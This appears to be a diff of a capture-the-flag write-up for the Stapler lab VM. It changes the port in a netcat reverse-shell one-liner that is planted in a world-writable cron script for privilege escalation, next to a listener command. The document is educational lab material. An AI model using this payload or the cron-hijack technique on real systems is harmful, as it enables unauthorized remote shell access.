@@ -74,7 +74,7 @@ By g0tmi1k
 * According to ``, a noteworthy piece of information is found in the section on `World Writable Files`, where the file `/usr/local/sbin/cron-logrotate.sh` has rwx permissions for all.
 * Opening up the `.sh` file shows us only a line of comment code, telling "Simon that he needs to do something about this". This reinforces the fact that we are looking at the right file - the person who put in this message for Simon probably realised what a malicious person can do with this.
 ![](/screenshots/stapler/cronLogRotateScript.jpg)
-* Insert `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 4444 >/tmp/f` into `cron-logrotate.sh`, and run `nc -v -l -p 1234` on our Kali VM.
+* Insert `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.2.15 1234 >/tmp/f` into `cron-logrotate.sh`, and run `nc -v -l -p 1234` on our Kali VM.
 * Note: The one-liner that was inserted is taken from a [cheat sheet on reverse shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md).
 * Note2: I thought of trying something simpler for the one-liner, but the `nc` running is from the `netcat-openbsd` package, which required something different:
 ![](/screenshots/stapler/netcatVariant.jpg)
